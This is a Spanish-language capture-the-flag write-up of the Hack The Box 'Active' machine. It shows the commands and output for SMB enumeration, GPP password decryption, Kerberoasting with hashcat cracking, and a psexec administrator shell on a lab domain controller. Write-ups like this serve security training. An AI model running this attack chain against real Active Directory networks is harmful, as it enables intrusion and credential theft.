---
layout: single
title: Active - Hack The Box
excerpt: "Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment."
date: 2025-07-02
classes: wide
header:
  teaser: /img2/active.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Windows
  - Easy
tags:
  - SMB Enumeration
  - Abusing GPP Passwords
  - Decrypting GPP Passwords - gpp-decrypt
  - Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]
---


## Reconnaissance

- Nmap

```bash
❯ nmap -sS --open -p- --min-rate 5000 -n -Pn 10.10.10.100
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 19:10 CEST
Nmap scan report for 10.10.10.100
Host is up (0.063s latency).
Not shown: 63732 closed tcp ports (reset), 1780 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
49171/tcp open  unknown
49173/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 24.04 seconds
```

- Crackmapexec

```bash
❯ crackmapexec smb 10.10.10.100
```

```ruby
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
```

- Add domain to /etc/hosts

```bash
❯ echo "10.10.10.100 active.htb" >> /etc/hosts
```

- SMB Enumeration

```bash
❯ smbmap -H 10.10.10.100
```

```ruby

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.10.100:445	Name: active.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	
[*] Closed 1 connections 
```

```bash
❯ smbclient //10.10.10.100/Replication -N
```

```ruby
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0,7 KiloBytes/sec) (average 0,3 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (18,3 KiloBytes/sec) (average 4,6 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (2,5 KiloBytes/sec) (average 4,1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (6,1 KiloBytes/sec) (average 4,4 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (22,7 KiloBytes/sec) (average 6,9 KiloBytes/sec)
```

```bash
❯ tree
```

```ruby
.
├── DfsrPrivate
│   ├── ConflictAndDeleted
│   ├── Deleted
│   └── Installing
├── Policies
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   │   ├── GPT.INI
│   │   ├── Group Policy
│   │   │   └── GPE.INI
│   │   ├── MACHINE
│   │   │   ├── Microsoft
│   │   │   │   └── Windows NT
│   │   │   │       └── SecEdit
│   │   │   │           └── GptTmpl.inf
│   │   │   ├── Preferences
│   │   │   │   └── Groups
│   │   │   │       └── Groups.xml
│   │   │   └── Registry.pol
│   │   └── USER
│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
│       ├── GPT.INI
│       ├── MACHINE
│       │   └── Microsoft
│       │       └── Windows NT
│       │           └── SecEdit
│       │               └── GptTmpl.inf
│       └── USER
└── scripts

22 directories, 7 files
```

```bash
❯ cat Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml
```

```ruby
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

> Vemos un usuario SVC_TGS y una contraseña encriptada en el Group Policy Preferences (GPP).

## Exploitation

- GPP decrypt password

```bash
❯ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

```ruby
GPPstillStandingStrong2k18
```

> Podemos comprobar las credenciales con crackmapexec.

```bash
❯ crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

```ruby
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
```

- Kerberoasting Attack

```bash
❯ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
```

```ruby
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2025-07-02 16:55:57.333400             
```

> Vemos que el usuario Administrador tiene un SPN expuesto, lo que nos permite pedir el TGT.

```bash
❯ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
```

```ruby
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2025-07-02 16:55:57.333400             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$6d02e7466adc3e2a1cd4ff3d937a204c$920411fc41dcfea5d9f82ad4c60f9b018dfe35b55caa8db75737b637aec2750ac6820c242976820ab4e9df40d74591b30c48f1eceb31ae6748358d28a24a349bd49d2259e971bdbe3b69b02a12817306a245f6cb80b1c1b83c9c1e94c4dd73dacbdec6e8f436715d9dcb44a025e0545a675b2580ce0b8fa231ba97655d95db6bb89e35d3901d8bda297bdabe145556ed6b976a31a01edf66a78ba383baa51850e267904322820bc9cfb3697fbed27a8c10d3a694241ede40cf1711523afde9205103ad0280940ab0a6ed3b4e998f2e3bde164cfd6d8005c69dd67d01a0d5d985d2680a583486a9a71c61ab2212cbb2fae7086ffe20ec1551397f6fadaefa340a5f18f49aadadd5c4897e7871d49aa2045777660db803d65428c57bb14c9e42b6c73f8c41e9b433f20919d6e38f1e45be5f1a7699a3055aa8b6b54d824350e6e18659f3ce9efd0c5b4a62c9061b66a521b2fd1282e41141af36ec330752425ee6083d594b227ef2bc0bd3399becbde92e26122f3b2aaf354c7d979ad0e5ac7570aa1fe3b06ab7255e691699231de3999ed3e1fdd0e355704f9f245fe9a37e525c67c638a2ea495e0d3ce5bdb66d4aa14b9f9a33fd2d9c9557f03eaf09805baffbb3e07ca15cd5b7597b2ad50cd14cbdcfc8abe318372e25e81c18b951c94b9eda2a8e6b1f2bdcad1b28abcf50f7ac4834f074fde3dfb89d10490c73a9c9c97f5993037bcd98a2b7827a2e74656604ef1b6476730e11b4fa2247272f98914b4cc5c8e973f30b92a9821f6b77525321ee7624a17193031e2daf686e4b82f081991308cb7b4cc20fd18080bfe5f1d075039db7d5f14d3a1ae44431e4c13880b1f2a22a14ee68a2cd95835c7f59aada251c0028754758560d0045a5d24e1b41b7512d67d120f9cc7836badd70e6c74a13fdeac3410ab3e05fdb41411caa7fd58e1426830102896f8fca98ecc44752513a971c3c80fd5ae430cfb1638a5ad7359f577426318a467b169da4826bd294802f6488824a3880e7aae94db0f0effcff9c7fccd39ec2c284c3c93109a40ce155c730d59b0ec83009aee85c1103b248293177d52ebed3e431e5a889c4f8231a8ff4a8558d64bfbb9bbee44a95ddeeed6dbc1f6ee7e2981667796cdad710dfdbd06ed9327709efc87eb34733d9aba977f0a61df990f57c5492db0c118c671445f26e60e03fca39479b9cc4677e6b9ad957998b1997548f17598a26f0c4ced006c23a800481fb8e9f3619ab494d60
```

- Cracking Kerberos Hash

```bash
❯ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```

```ruby
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 5 5600X 6-Core Processor, 6924/13913 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$6d02e7466adc3e2a1cd4ff3d937a204c$920411fc41dcfea5d9f82ad4c60f9b018dfe35b55caa8db75737b637aec2750ac6820c242976820ab4e9df40d74591b30c48f1eceb31ae6748358d28a24a349bd49d2259e971bdbe3b69b02a12817306a245f6cb80b1c1b83c9c1e94c4dd73dacbdec6e8f436715d9dcb44a025e0545a675b2580ce0b8fa231ba97655d95db6bb89e35d3901d8bda297bdabe145556ed6b976a31a01edf66a78ba383baa51850e267904322820bc9cfb3697fbed27a8c10d3a694241ede40cf1711523afde9205103ad0280940ab0a6ed3b4e998f2e3bde164cfd6d8005c69dd67d01a0d5d985d2680a583486a9a71c61ab2212cbb2fae7086ffe20ec1551397f6fadaefa340a5f18f49aadadd5c4897e7871d49aa2045777660db803d65428c57bb14c9e42b6c73f8c41e9b433f20919d6e38f1e45be5f1a7699a3055aa8b6b54d824350e6e18659f3ce9efd0c5b4a62c9061b66a521b2fd1282e41141af36ec330752425ee6083d594b227ef2bc0bd3399becbde92e26122f3b2aaf354c7d979ad0e5ac7570aa1fe3b06ab7255e691699231de3999ed3e1fdd0e355704f9f245fe9a37e525c67c638a2ea495e0d3ce5bdb66d4aa14b9f9a33fd2d9c9557f03eaf09805baffbb3e07ca15cd5b7597b2ad50cd14cbdcfc8abe318372e25e81c18b951c94b9eda2a8e6b1f2bdcad1b28abcf50f7ac4834f074fde3dfb89d10490c73a9c9c97f5993037bcd98a2b7827a2e74656604ef1b6476730e11b4fa2247272f98914b4cc5c8e973f30b92a9821f6b77525321ee7624a17193031e2daf686e4b82f081991308cb7b4cc20fd18080bfe5f1d075039db7d5f14d3a1ae44431e4c13880b1f2a22a14ee68a2cd95835c7f59aada251c0028754758560d0045a5d24e1b41b7512d67d120f9cc7836badd70e6c74a13fdeac3410ab3e05fdb41411caa7fd58e1426830102896f8fca98ecc44752513a971c3c80fd5ae430cfb1638a5ad7359f577426318a467b169da4826bd294802f6488824a3880e7aae94db0f0effcff9c7fccd39ec2c284c3c93109a40ce155c730d59b0ec83009aee85c1103b248293177d52ebed3e431e5a889c4f8231a8ff4a8558d64bfbb9bbee44a95ddeeed6dbc1f6ee7e2981667796cdad710dfdbd06ed9327709efc87eb34733d9aba977f0a61df990f57c5492db0c118c671445f26e60e03fca39479b9cc4677e6b9ad957998b1997548f17598a26f0c4ced006c23a800481fb8e9f3619ab494d60:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...494d60
Time.Started.....: Wed Jul  2 17:09:54 2025 (6 secs)
Time.Estimated...: Wed Jul  2 17:10:00 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1967.3 kH/s (2.11ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10543104/14344385 (73.50%)
Rejected.........: 0/10543104 (0.00%)
Restore.Point....: 10536960/14344385 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiffany95 -> Teague51
Hardware.Mon.#1..: Util: 70%

Started: Wed Jul  2 17:09:40 2025
Stopped: Wed Jul  2 17:10:01 2025
```

```bash
❯ crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968' 
```

```ruby
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```

- Shell con impacket-psexec

```bash
❯ impacket-psexec alert.htb/Administrator@10.10.10.100 cmd.exe
```

```ruby
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file qaPKohrn.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service NdHr on 10.10.10.100.....
[*] Starting service NdHr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```


![](/img2/Pasted%20image%2020250702171540.png)